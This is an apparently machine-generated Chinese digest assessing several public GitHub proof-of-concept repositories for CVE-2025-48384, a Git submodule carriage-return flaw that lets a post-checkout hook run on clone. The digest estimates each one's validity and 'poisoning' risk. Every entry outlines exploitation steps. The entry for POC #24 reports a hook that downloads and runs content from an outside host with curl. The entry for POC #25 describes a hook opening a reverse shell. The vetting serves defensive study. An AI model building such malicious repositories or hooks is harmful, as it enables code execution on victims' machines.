提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
